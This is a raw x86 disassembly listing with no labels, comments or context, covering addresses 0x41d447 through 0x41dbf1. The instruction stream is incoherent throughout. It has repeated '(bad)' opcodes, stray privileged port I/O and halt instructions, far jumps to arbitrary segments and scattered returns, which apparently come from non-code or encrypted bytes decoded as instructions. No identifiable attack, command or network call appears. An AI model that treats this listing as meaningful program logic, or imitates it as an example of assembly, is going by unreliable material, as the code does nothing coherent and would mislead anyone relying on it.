  41d447:	mov    dl,0x1d
  41d449:	and    DWORD PTR [esi+0x54],eax
  41d44c:	pop    ds
  41d44d:	(bad)  
  41d44e:	stos   BYTE PTR es:[edi],al
  41d44f:	in     al,dx
  41d450:	mov    ds:0xf45d3bf8,al
  41d455:	jge    0x41d3ee
  41d457:	jl     0x41d42e
  41d459:	xchg   ebx,eax
  41d45a:	dec    esp
  41d45b:	fst    DWORD PTR [edi-0x3]
  41d45e:	push   cs
  41d45f:	push   ds
  41d460:	xor    ecx,DWORD PTR [eax+ecx*2]
  41d463:	push   0x43
  41d465:	loopne 0x41d4d9
  41d467:	mul    DWORD PTR [eax-0x77e776fe]
  41d46d:	bound  edx,QWORD PTR [ecx]
  41d46f:	xor    BYTE PTR [edi],dh
  41d471:	addr16 cwde 
  41d473:	mov    WORD PTR [edx],ds
  41d475:	nop
  41d476:	pop    ebp
  41d477:	dec    edx
  41d478:	cmc    
  41d479:	aas    
  41d47a:	or     BYTE PTR [esi],bl
  41d47c:	jbe    0x41d41f
  41d47e:	push   eax
  41d47f:	jle    0x41d4b8
  41d481:	repnz cs push esp
  41d484:	add    al,bh
  41d486:	pop    ecx
  41d487:	mov    WORD PTR [eax+0x20],gs
  41d48a:	pushf  
  41d48b:	inc    esp
  41d48c:	dec    ebx
  41d48d:	cmp    eax,DWORD PTR [ebp+ecx*2+0x46]
  41d491:	fsubr  QWORD PTR [ecx+0x7f]
  41d494:	or     al,0xd6
  41d496:	jg     0x41d4c9
  41d498:	and    al,ch
  41d49a:	sahf   
  41d49b:	mov    bl,0x8
  41d49d:	inc    DWORD PTR [ebx+eax*1]
  41d4a0:	ins    DWORD PTR es:[edi],dx
  41d4a1:	add    esp,DWORD PTR [esi+0x636d162c]
  41d4a7:	inc    esi
  41d4a8:	mov    eax,ds
  41d4aa:	mov    al,0x0
  41d4ac:	or     DWORD PTR es:[ecx+0x67],eax
  41d4b0:	xchg   edi,eax
  41d4b1:	add    eax,0x6626720b
  41d4b6:	pop    edi
  41d4b7:	jge    0x41d450
  41d4b9:	lea    ebp,[eax+esi*4+0xf]
  41d4bd:	or     ecx,DWORD PTR [ecx+0x200a3c5f]
  41d4c3:	push   esi
  41d4c4:	sti    
  41d4c5:	test   eax,0x2b400b53
  41d4ca:	ret    
  41d4cb:	adc    eax,0xc1b35140
  41d4d0:	sbb    BYTE PTR [ebx-0x28],0x17
  41d4d4:	fdiv   DWORD PTR [eax-0x74cc9a00]
  41d4da:	and    esp,esp
  41d4dc:	test   bh,bh
  41d4de:	mov    al,0x3b
  41d4e0:	and    cl,BYTE PTR [edx-0x7e00ccac]
  41d4e6:	loop   0x41d528
  41d4e8:	adc    eax,0x461f053a
  41d4ed:	pop    ebp
  41d4ee:	add    eax,esi
  41d4f0:	dec    eax
  41d4f1:	out    0x2d,al
  41d4f3:	mov    al,ds:0xcc138c17
  41d4f8:	sar    DWORD PTR [esp],0xcb
  41d4fc:	popa   
  41d4fd:	cmp    DWORD PTR [esi+ebx*1],esp
  41d500:	adc    DWORD PTR [ebx-0x64ab9f3a],ecx
  41d506:	pushf  
  41d507:	ret    
  41d508:	pop    es
  41d509:	dec    edi
  41d50a:	xchg   BYTE PTR [ecx+0x1b],dl
  41d50d:	xor    al,0xda
  41d50f:	push   esi
  41d510:	idiv   BYTE PTR [edx]
  41d512:	push   eax
  41d513:	mov    WORD PTR [edx-0x34],?
  41d516:	arpl   WORD PTR [edx],cx
  41d518:	ds cs fs pusha 
  41d51c:	add    al,BYTE PTR [edx+0x35]
  41d51f:	retf   
  41d520:	sub    esi,edi
  41d522:	and    al,0x8a
  41d524:	inc    edi
  41d525:	sbb    DWORD PTR [eax+edi*1],ebp
  41d528:	mov    ebx,0xc5121393
  41d52d:	mov    ebp,0xd460dd9e
  41d532:	cli    
  41d533:	sbb    al,0x4a
  41d535:	jo     0x41d4d6
  41d537:	ror    dh,0xc2
  41d53a:	loopne 0x41d533
  41d53c:	mov    ebp,0x53f80d54
  41d541:	pop    ebp
  41d542:	inc    eax
  41d543:	arpl   WORD PTR [eax],bx
  41d545:	pop    ebp
  41d546:	pusha  
  41d547:	je     0x41d4e7
  41d549:	in     al,0xc0
  41d54b:	ret    
  41d54c:	stos   BYTE PTR es:[edi],al
  41d54d:	and    DWORD PTR [edi],esp
  41d54f:	test   BYTE PTR [eax-0x797f61c9],al
  41d555:	jo     0x41d4ef
  41d557:	sub    DWORD PTR [edi],edx
  41d559:	imul   BYTE PTR [ebp-0x45]
  41d55c:	mov    WORD PTR [edi+0x74],ss
  41d55f:	and    ebx,DWORD PTR [ebx+ecx*4+0xfbe7fd5]
  41d566:	and    eax,DWORD PTR [esp+edi*2]
  41d569:	cmp    ebp,ebx
  41d56b:	jl     0x41d5c8
  41d56d:	and    cl,BYTE PTR [eax+ebx*1]
  41d570:	mov    BYTE PTR [esi],cl
  41d572:	fldcw  WORD PTR [ecx]
  41d574:	jmp    0x2440edcd
  41d579:	adc    al,BYTE PTR [ebx+0x21]
  41d57c:	jmp    0x41d596
  41d57e:	jnp    0x41d5a0
  41d580:	call   0x1c0c:0x140715ab
  41d587:	in     al,0xba
  41d589:	in     eax,dx
  41d58a:	push   es
  41d58b:	adc    BYTE PTR [eax],0x20
  41d58e:	inc    ebx
  41d58f:	dec    edi
  41d590:	jge    0x41d542
  41d592:	mov    dh,0x8f
  41d594:	pop    ss
  41d595:	loope  0x41d59f
  41d597:	and    bl,BYTE PTR [ebp+0xc]
  41d59a:	or     al,0x8b
  41d59c:	push   ebp
  41d59d:	fnsave [ecx-0x74051b18]
  41d5a3:	call   0x7dc28695
  41d5a8:	arpl   WORD PTR [esp+esi*2-0x6e5f0931],ax
  41d5af:	inc    ebp
  41d5b0:	adc    DWORD PTR [ecx-0x637fefc1],ecx
  41d5b6:	and    BYTE PTR [eax],bl
  41d5b8:	shr    DWORD PTR [edi+0x64],0x74
  41d5bc:	jecxz  0x41d56a
  41d5be:	imul   eax,DWORD PTR [edx],0x15d7f8f5
  41d5c4:	cld    
  41d5c5:	push   ebx
  41d5c6:	add    eax,0x6bc6a141
  41d5cb:	repnz add ebx,ebx
  41d5ce:	cmp    ebx,DWORD PTR [esi+0x53a89b89]
  41d5d4:	sti    
  41d5d5:	add    dh,BYTE PTR [ecx+ebx*1+0x66]
  41d5d9:	push   esi
  41d5da:	das    
  41d5db:	fisub  DWORD PTR [esi]
  41d5dd:	mov    WORD PTR [eax+0x3218f895],es
  41d5e3:	int    0x39
  41d5e5:	(bad)  
  41d5e6:	or     DWORD PTR [edi+0x44402e9],ecx
  41d5ec:	shr    DWORD PTR [esi-0x7c],0x61
  41d5f0:	inc    ebp
  41d5f1:	mov    ecx,0xc52b100f
  41d5f6:	int    0x78
  41d5f8:	inc    DWORD PTR [eax-0x59]
  41d5fb:	sar    BYTE PTR [ebx],1
  41d5fd:	bnd jbe 0x41d5a7
  41d600:	mov    ds:0x4b7a8eae,al
  41d605:	mov    bh,BYTE PTR [edi+esi*2-0x330a0aea]
  41d60c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d60d:	mov    al,ds:0x94a0ef06
  41d612:	sahf   
  41d613:	cwde   
  41d614:	jne    0x41d61b
  41d616:	jne    0x41d65f
  41d618:	sbb    eax,0x3a0e1849
  41d61d:	mov    ds:0x21ce0d65,al
  41d622:	arpl   ax,bp
  41d624:	push   ebp
  41d625:	xchg   DWORD PTR [eax],ebx
  41d627:	pop    es
  41d628:	in     eax,dx
  41d629:	cli    
  41d62a:	xchg   ebx,eax
  41d62b:	inc    eax
  41d62c:	pop    es
  41d62d:	and    DWORD PTR [edx+0x28],esp
  41d630:	popf   
  41d631:	fcomp  QWORD PTR fs:[edx+0x5048fd54]
  41d638:	daa    
  41d639:	mov    edx,DWORD PTR [edi]
  41d63b:	sub    edx,esi
  41d63d:	add    bh,dl
  41d63f:	push   ss
  41d640:	jmp    0xb002:0x7418e48d
  41d647:	pop    es
  41d648:	add    DWORD PTR [esi],esp
  41d64a:	cmp    BYTE PTR [eax+0x7b],dl
  41d64d:	dec    ecx
  41d64e:	pop    es
  41d64f:	jne    0x41d62a
  41d651:	or     eax,0x79e4727f
  41d656:	test   al,0x6f
  41d658:	hlt    
  41d659:	hlt    
  41d65a:	mov    eax,ds:0x9a071744
  41d65f:	dec    esp
  41d660:	stc    
  41d661:	mov    edx,0x54203100
  41d666:	cmp    BYTE PTR [ecx],dl
  41d668:	outs   dx,DWORD PTR ds:[esi]
  41d669:	hlt    
  41d66a:	mov    BYTE PTR ds:0x1bfa1380,al
  41d670:	pop    eax
  41d671:	adc    ch,dh
  41d673:	test   cl,dh
  41d675:	mov    bh,0x6b
  41d677:	mov    eax,ds:0x68e82f4b
  41d67c:	xchg   edx,eax
  41d67d:	test   al,0x1
  41d67f:	mov    bh,0x7d
  41d681:	idiv   BYTE PTR ds:0xec74ab71
  41d687:	push   edi
  41d688:	sub    al,0x38
  41d68a:	in     al,0xdc
  41d68c:	dec    ebp
  41d68d:	dec    DWORD PTR [esi]
  41d68f:	mov    al,ds:0x320c834
  41d694:	aaa    
  41d695:	push   es
  41d696:	mov    bl,BYTE PTR [edi+esi*1+0x7]
  41d69a:	sub    bl,al
  41d69c:	xchg   ecx,eax
  41d69d:	rcr    eax,0xf8
  41d6a0:	jb     0x41d6bc
  41d6a2:	inc    ebx
  41d6a3:	mov    BYTE PTR [ebp+0x46],al
  41d6a6:	inc    ebp
  41d6a7:	inc    ebp
  41d6a8:	stos   DWORD PTR es:[edi],eax
  41d6a9:	std    
  41d6aa:	add    dl,al
  41d6ac:	mov    bh,0xfe
  41d6ae:	push   cs
  41d6af:	dec    bl
  41d6b1:	jne    0x41d69d
  41d6b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6b4:	cmp    esi,0xc
  41d6b7:	jge    0x41d6c3
  41d6b9:	mov    BYTE PTR [eax],dl
  41d6bb:	jo     0x41d6b6
  41d6bd:	sub    eax,0xc875440a
  41d6c2:	or     eax,0xa47c63ea
  41d6c7:	xor    edi,eax
  41d6c9:	pop    ds
  41d6ca:	ja     0x41d6d3
  41d6cc:	jne    0x41d710
  41d6ce:	cld    
  41d6cf:	setb   BYTE PTR [ebp+0x3e]
  41d6d3:	les    ecx,FWORD PTR [ebx-0x19b8ca5]
  41d6d9:	mov    DWORD PTR ds:0xf0cc7906,0x9da0976
  41d6e3:	cmp    al,0x9
  41d6e5:	add    BYTE PTR [eax+0x6b],al
  41d6e8:	mov    BYTE PTR [ebx+0x3c],dl
  41d6eb:	leave  
  41d6ec:	mov    ds:0x8225a3ae,al
  41d6f1:	call   0xe41b:0x966eeb6
  41d6f8:	jmpw   0xc5ff
  41d6fc:	(bad)  
  41d6fd:	loopne 0x41d75c
  41d6ff:	(bad)
  41d703:	cmp    cl,al
  41d705:	call   0xaa48f614
  41d70a:	iret   
  41d70b:	fild   DWORD PTR [eax-0x42]
  41d70e:	cwde   
  41d70f:	mov    ds:0x8b9bf24,eax
  41d714:	and    ebx,DWORD PTR [ebp+ebp*2+0x2821274]
  41d71b:	imul   BYTE PTR [ebp-0x2725eb5]
  41d721:	ss add al,0xb9
  41d724:	adc    eax,esi
  41d726:	pop    esi
  41d727:	inc    ebp
  41d728:	add    BYTE PTR [esi],al
  41d72a:	inc    esp
  41d72b:	jge    0x41d70c
  41d72d:	fistp  WORD PTR [edi+0x60]
  41d730:	mov    ds:0x501c5519,eax
  41d735:	pop    ecx
  41d736:	mov    eax,0xb145ba3b
  41d73b:	jmp    0x41d7b5
  41d73d:	jg     0x41d746
  41d73f:	mov    eax,0x950fac1d
  41d744:	ret    
  41d745:	mov    BYTE PTR ds:0x370c1126,bl
  41d74b:	shr    al,1
  41d74d:	jno    0x41d785
  41d74f:	xor    BYTE PTR [eax-0x1ee4a630],bh
  41d755:	ficom  WORD PTR [esp+eiz*4]
  41d758:	mov    BYTE PTR [edx],al
  41d75a:	inc    eax
  41d75b:	inc    edx
  41d75c:	addr16 pop ds
  41d75e:	cmc    
  41d75f:	test   al,0x54
  41d761:	mov    esp,0x47102e46
  41d766:	push   ebx
  41d767:	adc    ebx,esp
  41d769:	fnstcw WORD PTR [esi+eiz*2+0x68]
  41d76d:	neg    BYTE PTR [ebx]
  41d76f:	add    eax,0x242211b
  41d774:	pop    ebp
  41d775:	mov    edi,0xf1503b30
  41d77a:	mov    esi,0x836621fd
  41d77f:	cmp    bl,BYTE PTR [ebp+0xd88c194]
  41d785:	pop    ecx
  41d786:	sar    DWORD PTR [edi+0x3653b501],cl
  41d78c:	jns    0x41d7d6
  41d78e:	jne    0x41d779
  41d790:	jmp    0x41d7c0
  41d792:	push   0x4a
  41d794:	cli    
  41d795:	sub    al,0xd9
  41d797:	out    dx,eax
  41d798:	dec    sp
  41d79a:	pusha  
  41d79b:	xchg   ebp,eax
  41d79c:	shl    BYTE PTR [edx+0x102a6a1c],0x92
  41d7a3:	popa   
  41d7a4:	add    eax,0xb707bb05
  41d7a9:	in     eax,0x45
  41d7ab:	xor    BYTE PTR [edx+esi*4],ch
  41d7ae:	add    BYTE PTR [edi+0x18],dh
  41d7b1:	outs   dx,DWORD PTR ds:[esi]
  41d7b2:	repnz lods al,BYTE PTR ds:[esi]
  41d7b4:	jg     0x41d77a
  41d7b6:	dec    ecx
  41d7b7:	jne    0x41d7b2
  41d7b9:	push   ebx
  41d7ba:	ret    0xfa6
  41d7bd:	dec    edx
  41d7be:	add    al,0xc3
  41d7c0:	jmp    0xae5f:0x98eec8a0
  41d7c7:	push   0x8d2ad844
  41d7cc:	jo     0x41d751
  41d7ce:	push   edx
  41d7cf:	add    DWORD PTR [eax-0x59],0xffffffe2
  41d7d3:	adc    bl,al
  41d7d5:	mov    edx,0x11d0d414
  41d7da:	xor    al,0x8a
  41d7dc:	sub    eax,DWORD PTR [edx-0x2227870b]
  41d7e2:	mov    DWORD PTR [esi-0x62],ecx
  41d7e5:	pop    esi
  41d7e6:	dec    esp
  41d7e7:	and    al,0xba
  41d7e9:	sbb    esp,DWORD PTR [ecx]
  41d7eb:	push   ecx
  41d7ec:	addr16 push eax
  41d7ee:	or     edx,DWORD PTR [edi+edi*2]
  41d7f1:	mov    ds:0x73641903,al
  41d7f6:	xchg   edx,eax
  41d7f7:	and    ebp,eax
  41d7f9:	sbb    al,0xc0
  41d7fb:	mov    al,0x1f
  41d7fd:	nop
  41d7fe:	call   0xba6e8980
  41d803:	nop    DWORD PTR [esi+0x7eaff90b]
  41d80a:	adc    bh,BYTE PTR [esi-0x4f]
  41d80d:	cs mov edx,0xe4497f0e
  41d813:	add    DWORD PTR [ecx],edi
  41d815:	nop
  41d816:	inc    ecx
  41d817:	sbb    esp,esp
  41d819:	inc    edi
  41d81a:	xchg   esi,eax
  41d81b:	or     edi,ebx
  41d81d:	xor    BYTE PTR [ecx+0x361dba2f],0x81
  41d824:	fdiv   QWORD PTR [eax]
  41d826:	mov    edx,0x90380d76
  41d82b:	pop    ds
  41d82c:	fdivr  QWORD PTR [eax+0x1e208ed1]
  41d832:	sbb    esp,esp
  41d834:	pop    ecx
  41d835:	loopne 0x41d7bb
  41d837:	aam    0x2c
  41d839:	inc    eax
  41d83a:	mov    edx,0xe5906720
  41d83f:	inc    eax
  41d840:	aam    0xd8
  41d842:	fsubr  DWORD PTR [edi+edx*1-0xa]
  41d846:	xchg   ecx,eax
  41d847:	mov    BYTE PTR [ecx+0x6c1eba3a],dh
  41d84d:	mov    WORD PTR [edi],?
  41d84f:	shl    dl,1
  41d851:	sbb    eax,0xba588f08
  41d856:	sub    BYTE PTR [ebx],dh
  41d858:	shl    BYTE PTR [ecx-0x70],1
  41d85b:	jae    0x41d87d
  41d85d:	(bad)  
  41d85e:	or     eax,0xba6421cc
  41d863:	sub    esp,ecx
  41d865:	dec    eax
  41d866:	adc    eax,DWORD PTR [edx-0x3d1a6b37]
  41d86c:	push   cs
  41d86d:	fs nop
  41d86f:	ins    DWORD PTR es:[edi],dx
  41d870:	test   eax,0xc2acc825
  41d876:	inc    eax
  41d877:	inc    ecx
  41d878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d879:	inc    ecx
  41d87a:	pop    ecx
  41d87b:	mov    esi,0x70a67207
  41d880:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d881:	jl     0x41d8c1
  41d883:	enter  0xbbc4,0xe4
  41d887:	inc    eax
  41d888:	push   es
  41d889:	and    eax,esp
  41d88b:	aas    
  41d88c:	popa   
  41d88d:	enter  0x1c80,0x64
  41d891:	rol    BYTE PTR ds:0x4df2c010,0xf2
  41d898:	dec    esp
  41d899:	hlt    
  41d89a:	mov    al,bh
  41d89c:	push   cs
  41d89d:	cwde   
  41d89e:	(bad)  
  41d89f:	push   ss
  41d8a0:	aam    0x28
  41d8a2:	test   DWORD PTR [ebx],ecx
  41d8a4:	cld    
  41d8a5:	push   ebp
  41d8a6:	push   cs
  41d8a7:	add    bh,BYTE PTR [ebp-0x25]
  41d8aa:	test   al,0x7
  41d8ac:	hlt    
  41d8ad:	enter  0xd698,0x30
  41d8b1:	mov    WORD PTR [eax+0x1ccb9064],?
  41d8b7:	mov    ah,0x9c
  41d8b9:	pop    es
  41d8ba:	lods   al,BYTE PTR ds:[esi]
  41d8bb:	adc    edx,edx
  41d8bd:	clc    
  41d8be:	or     al,0x57
  41d8c0:	inc    esi
  41d8c1:	lds    esp,FWORD PTR [esi+0x248c6616]
  41d8c7:	jbe    0x41d861
  41d8c9:	mov    edx,0x7df63110
  41d8ce:	sbb    DWORD PTR [edx+0x6d06ef02],esi
  41d8d4:	das    
  41d8d5:	fs das 
  41d8d7:	hlt    
  41d8d8:	out    dx,al
  41d8d9:	or     eax,DWORD PTR [esi]
  41d8db:	add    edx,DWORD PTR [edi+0x6d]
  41d8de:	add    BYTE PTR [eax],ah
  41d8e0:	fs sub al,0x20
  41d8e3:	cs mov ebx,0x22f180c
  41d8e9:	popa   
  41d8ea:	ins    DWORD PTR es:[edi],dx
  41d8eb:	or     esi,DWORD PTR [eax-0x20]
  41d8ee:	cmp    BYTE PTR [ebp+0x41],0x4b
  41d8f2:	push   0x76686823
  41d8f7:	and    BYTE PTR [esi],ah
  41d8f9:	and    DWORD PTR [ebx],0x20
  41d8fc:	sub    BYTE PTR [edi],cl
  41d8fe:	mov    ebx,0xe5be00c
  41d903:	and    BYTE PTR [edi-0x114899c6],bh
  41d909:	cs pop ecx
  41d90b:	or     DWORD PTR [ebx],0x3a
  41d90e:	jae    0x41d983
  41d910:	sbb    esp,DWORD PTR ds:0x260463cd
  41d916:	adc    ebx,DWORD PTR [eax+edx*1+0x17f4ec7f]
  41d91d:	add    BYTE PTR [esp+eiz*8+0x54a77b48],bl
  41d924:	dec    edx
  41d925:	clc    
  41d926:	sub    BYTE PTR [ebp+edx*1+0x3d],ch
  41d92a:	cmp    esi,DWORD PTR [edi]
  41d92c:	push   0xd55a60c6
  41d931:	test   BYTE PTR ds:0x827cecdf,al
  41d937:	clc    
  41d938:	push   esp
  41d939:	fwait
  41d93a:	or     eax,0x6a0efc13
  41d940:	add    DWORD PTR [edx-0x64],eax
  41d943:	iret   
  41d944:	mov    ss,WORD PTR [ebp+0x47]
  41d947:	enter  0xc59,0xee
  41d94b:	jno    0x41d966
  41d94d:	nop
  41d94e:	fist   WORD PTR [edx*1-0x768fd3b8]
  41d955:	pop    edx
  41d956:	add    DWORD PTR [ebx-0x3d38d3bd],eax
  41d95c:	or     cl,BYTE PTR [edi]
  41d95e:	sbb    esp,DWORD PTR [ecx]
  41d960:	and    ebx,ecx
  41d962:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d963:	pop    ebx
  41d964:	in     al,dx
  41d965:	inc    esp
  41d966:	push   ebx
  41d967:	jge    0x41d97c
  41d969:	add    eax,0xf175e9ea
  41d96e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d96f:	(bad)  
  41d970:	fbld   TBYTE PTR [edx+0x31aaa685]
  41d976:	inc    ebx
  41d977:	mov    dh,ah
  41d979:	adc    eax,0xc6ad89c4
  41d97e:	add    ebx,DWORD PTR [eax]
  41d980:	and    BYTE PTR [edx],bl
  41d982:	or     eax,0x24
  41d985:	or     BYTE PTR [esi],al
  41d987:	outs   dx,DWORD PTR ds:[esi]
  41d988:	adc    bl,BYTE PTR [ebp-0xb]
  41d98b:	pop    es
  41d98c:	adc    ch,ah
  41d98e:	add    edx,DWORD PTR [esi+0x7c]
  41d991:	(bad)  
  41d992:	and    bh,BYTE PTR [ebx+0x184bc3d4]
  41d998:	data16 in al,0x53
  41d99b:	adc    BYTE PTR [eax],ah
  41d99d:	fcomp  st(2)
  41d99f:	or     DWORD PTR ds:0x87284198,0x280a2e05
  41d9a9:	sbb    ch,bl
  41d9ab:	or     ch,BYTE PTR [eax+0x445b1288]
  41d9b1:	cld    
  41d9b2:	lahf   
  41d9b3:	inc    eax
  41d9b4:	xchg   ebx,eax
  41d9b5:	inc    esp
  41d9b6:	imul   esi,DWORD PTR [ebx+0x6b],0x65657246
  41d9bd:	push   ebx
  41d9be:	jo     0x41d980
  41d9c0:	pop    ds
  41d9c1:	jmp    0x41:0x78459c1b
  41d9c8:	lea    edx,[edx-0x573ef010]
  41d9ce:	ds jbe 0x41d989
  41d9d1:	gs ret 
  41d9d3:	mov    edx,0xc3480b58
  41d9d8:	xchg   DWORD PTR [eax],edx
  41d9da:	adc    ah,BYTE PTR [edx]
  41d9dc:	cwde   
  41d9dd:	cmp    eax,0x154b1a07
  41d9e2:	cmc    
  41d9e3:	inc    eax
  41d9e4:	inc    eax
  41d9e5:	jmp    0x87d8:0x821e0a88
  41d9ec:	lea    esi,[eax+ebp*1+0x8]
  41d9f0:	adc    cl,dh
  41d9f2:	rcr    dh,1
  41d9f4:	xchg   edx,eax
  41d9f5:	inc    esp
  41d9f6:	lahf   
  41d9f7:	add    al,0xc0
  41d9f9:	jne    0x41da02
  41d9fb:	aad    0x2
  41d9fd:	loop   0x41da14
  41d9ff:	sbb    dh,al
  41da01:	ror    BYTE PTR [ebx+0x71],1
  41da04:	(bad)  
  41da05:	imul   ah
  41da07:	int3   
  41da08:	aad    0xe3
  41da0a:	adc    cl,dh
  41da0c:	sbb    ah,al
  41da0e:	in     eax,dx
  41da0f:	jne    0x41d9e2
  41da11:	mov    bh,BYTE PTR ds:0x2245e280
  41da17:	cmp    BYTE PTR [eax+0x76c70502],al
  41da1d:	dec    ebp
  41da1e:	jle    0x41da27
  41da20:	or     al,0x24
  41da22:	in     al,dx
  41da23:	cmp    edi,DWORD PTR [ebx+0x515c3835]
  41da29:	mov    cl,0x89
  41da2b:	inc    edi
  41da2c:	dec    BYTE PTR [edx+0x5d0e8402]
  41da32:	bound  esi,QWORD PTR [edx]
  41da34:	push   es
  41da35:	and    al,0xf
  41da37:	mov    bh,0x13
  41da39:	jno    0x41da5d
  41da3b:	jb     0x41da01
  41da3d:	mov    eax,0x8562878f
  41da42:	and    edi,ebp
  41da44:	test   al,0x88
  41da46:	adc    ebp,DWORD PTR [eax+ebp*1]
  41da49:	dec    eax
  41da4a:	inc    esp
  41da4b:	das    
  41da4c:	fisttp DWORD PTR [edx+0x7868cc3]
  41da52:	jmp    0x41da5a
  41da54:	inc    ebx
  41da55:	mov    eax,0xa960adc4
  41da5a:	pop    es
  41da5b:	cmp    ebx,ebp
  41da5d:	jne    0x41da4d
  41da5f:	js     0x41da77
  41da61:	(bad)  
  41da62:	mov    esi,0xa932410d
  41da67:	inc    esp
  41da68:	sbb    esi,DWORD PTR [ebx]
  41da6a:	mov    eax,0xc1ee95bc
  41da6f:	lock pop ebx
  41da71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41da72:	mov    DWORD PTR ds:0x40c70489,esp
  41da78:	or     BYTE PTR [edi+0x61],bl
  41da7b:	cmp    edx,DWORD PTR [eax]
  41da7d:	fmul   QWORD PTR [edi]
  41da7f:	pop    ss
  41da80:	into   
  41da81:	push   eax
  41da82:	lea    ebx,[esp+esi*2+0x5f]
  41da86:	xor    ecx,DWORD PTR [ebx]
  41da88:	push   0xe402120c
  41da8d:	pop    edx
  41da8e:	mov    ah,BYTE PTR [eax-0xf]
  41da91:	sbb    eax,ebp
  41da93:	sbb    eax,DWORD PTR [edx]
  41da95:	pop    ebp
  41da96:	ins    BYTE PTR es:[edi],dx
  41da97:	inc    ecx
  41da98:	or     edx,DWORD PTR [esi+0x50590258]
  41da9e:	pop    DWORD PTR [ebx]
  41daa0:	aam    0x8b
  41daa2:	or     BYTE PTR [edi+0xb305b2e],ch
  41daa8:	xchg   ecx,eax
  41daa9:	jo     0x41da45
  41daab:	int3   
  41daac:	pop    ds
  41daad:	sbb    esi,0x6
  41dab0:	push   esp
  41dab1:	jns    0x41dacc
  41dab3:	xor    BYTE PTR [edi+0x1acf60ba],bh
  41dab9:	mov    esp,0x81d850cf
  41dabe:	sti    
  41dabf:	or     al,0xfb
  41dac1:	rcl    DWORD PTR [esi],0x89
  41dac4:	adc    BYTE PTR [edx+0x442f500],0xeb
  41dacb:	or     edi,DWORD PTR [esi]
  41dacd:	add    eax,DWORD PTR [ecx+0x5f745566]
  41dad3:	jecxz  0x41da5a
  41dad5:	cli    
  41dad6:	fcom   DWORD PTR [edi+0x68]
  41dad9:	ror    al,cl
  41dadb:	and    bl,BYTE PTR [eax]
  41dadd:	mov    DWORD PTR [esi-0x17],0x637211f
  41dae4:	jno    0x41dae5
  41dae6:	add    DWORD PTR [esi+0x10468990],edi
  41daec:	mov    dh,0xc9
  41daee:	bound  edx,QWORD PTR [ecx+0x78]
  41daf1:	unpcklps xmm4,XMMWORD PTR [esi]
  41daf4:	sbb    BYTE PTR [ebp-0x4f],ch
  41daf7:	arpl   WORD PTR [ebx+ebx*8],bx
  41dafa:	mov    esi,0x1539185a
  41daff:	and    BYTE PTR [ebx],al
  41db01:	push   es
  41db02:	adc    BYTE PTR [eax+0x23c6d043],ch
  41db08:	ret    
  41db09:	mov    cl,BYTE PTR [edx+0x6ddeea30]
  41db0f:	in     al,0xa1
  41db11:	shr    BYTE PTR [edx-0x3949a768],1
  41db17:	mov    esp,DWORD PTR [edx+0x43]
  41db1a:	mov    dh,0x48
  41db1c:	add    al,0x8c
  41db1e:	or     BYTE PTR [ecx+edx*4],dl
  41db21:	xchg   dh,dh
  41db23:	and    BYTE PTR [eax],0x8
  41db26:	push   ecx
  41db27:	into   
  41db28:	mov    BYTE PTR [esi],0xec
  41db2b:	fmul   DWORD PTR [ecx]
  41db2d:	pop    ds
  41db2e:	inc    eax
  41db2f:	sub    DWORD PTR [ebx+0x68],ecx
  41db32:	or     edi,DWORD PTR [eax+0x3b]
  41db35:	in     al,dx
  41db36:	dec    ebx
  41db37:	inc    esi
  41db38:	adc    al,0x50
  41db3a:	sbb    BYTE PTR [edx+0x1b],dl
  41db3d:	nop
  41db3e:	nop    DWORD PTR [edx+0x49]
  41db42:	es adc al,0xb
  41db45:	call   0x3684dcfd
  41db4a:	cli    
  41db4b:	or     DWORD PTR [edi],esp
  41db4d:	clc    
  41db4e:	cmp    edi,DWORD PTR [ebp+0x24]
  41db51:	repz test BYTE PTR [ecx],cl
  41db54:	mov    dl,cl
  41db56:	(bad)  
  41db57:	stos   BYTE PTR es:[edi],al
  41db58:	push   esp
  41db59:	data16 sub dh,dh
  41db5c:	xor    al,0x6
  41db5e:	sbb    DWORD PTR [eax-0x5f5779a1],ebp
  41db64:	add    al,0x8d
  41db66:	dec    ebx
  41db67:	int    0x52
  41db69:	test   DWORD PTR [edi],0x24e2c397
  41db6f:	xchg   ecx,eax
  41db70:	or     al,0xa7
  41db72:	push   0x1a
  41db74:	add    ebp,edx
  41db76:	cmp    esi,DWORD PTR [ecx+ecx*1-0x46]
  41db7a:	xor    BYTE PTR [esp+edx*1],ah
  41db7d:	inc    ebp
  41db7e:	arpl   WORD PTR [esi+0x4207ecef],bp
  41db84:	mov    BYTE PTR [ecx],bl
  41db86:	add    DWORD PTR [edx+0x19],ebx
  41db89:	cmp    eax,0x7ec1749c
  41db8e:	and    esi,DWORD PTR [ebp-0x2e]
  41db91:	pop    ebp
  41db92:	inc    edx
  41db93:	or     BYTE PTR [eax+0x2dd23b85],ch
  41db99:	cwde   
  41db9a:	jge    0x41dbe9
  41db9c:	sub    BYTE PTR [eax+0x3b],cl
  41db9f:	jb     0x41db61
  41dba1:	pusha  
  41dba2:	adc    al,0xbe
  41dba4:	pop    ebp
  41dba5:	ret    
  41dba6:	inc    DWORD PTR [ebp+0x1c]
  41dba9:	out    dx,al
  41dbaa:	adc    BYTE PTR [eax+0x33a4ff6d],dl
  41dbb0:	mov    eax,DWORD PTR [esi+0x1c4bff43]
  41dbb6:	cmp    DWORD PTR [ebx+0x1c],0x49
  41dbba:	and    BYTE PTR [ebp+0x7],bh
  41dbbd:	mov    dh,0x35
  41dbbf:	sbb    eax,0x7c433843
  41dbc4:	ret    
  41dbc5:	pop    ebx
  41dbc6:	ins    BYTE PTR es:[edi],dx
  41dbc7:	push   ds
  41dbc8:	call   0xaf60:0x69d
  41dbce:	sar    DWORD PTR [ebx],0xa9
  41dbd1:	xor    al,0xf7
  41dbd3:	rol    DWORD PTR [eax+ecx*1-0x2707003d],1
  41dbda:	rcr    DWORD PTR [ebp+edi*1+0x40ff4749],0xc
  41dbe2:	fiadd  WORD PTR [ecx]
  41dbe4:	adc    dh,bh
  41dbe6:	dec    eax
  41dbe7:	mov    bh,0x1f
  41dbe9:	cmp    eax,DWORD PTR [edi+0x24]
  41dbec:	je     0x41dc2e
  41dbee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbef:	jne    0x41dc2d
  41dbf1:	dec    eax
